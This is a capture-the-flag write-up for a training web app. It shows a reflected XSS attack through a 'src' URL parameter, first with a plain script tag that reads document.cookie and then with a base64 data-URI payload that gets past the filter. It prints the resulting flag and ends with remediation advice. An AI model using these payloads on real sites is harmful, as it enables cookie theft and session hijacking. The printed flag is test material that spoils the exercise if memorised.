# situation

The thing here is that it uses the image source to load the image. So you can directly create data in url.

when we clic on nsa image website open this page : 

## http://192.168.56.101/?page=media&src=nsa
we have a way to charge src we want so we can do xss attack

we try  http://192.168.56.101/?page=media&src=Montpellier<script>alert(document.cookie);</script> 

send to a page white sorry wrong answer + error 404 jpg

I think server read <script> and sanityze it. 

The URL contains a src field, so we can assume that it loads documents from the server that are located in src
It is explained in a XSS Using Code Encoding data section of this site: https://owasp.org/www-community/attacks/xss/


I am trying to encode <script>alert('coucou')</script> in base 64 and it gives me : PHNjcmlwdD5hbGVydCgnY291Y291Jyk8L3NjcmlwdD4=

It s explained here : https://owasp.org/www-community/attacks/xss/
at section : XSS Using Code Encoding
so we try : http://192.168.56.101/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnY291Y291Jyk8L3NjcmlwdD4=
and give us that : THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D

flag : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
# problem
 that allows an attacker to inject malicious code (usually JavaScript) into a web page visited by a user. This malicious code can then be executed by the user's browser, allowing the attacker to steal sensitive information, such as authentication cookies, or perform malicious actions on the user's browser.



# solution
By avoiding directly inserting the data from the URL into the page, and by passing IDs that would point to images (in the DB)
Dont use the url to choose the data you are going to load.
Check and sanityze requests you receive. 
The best in this case would have been t make a tab with images names and urls like in database.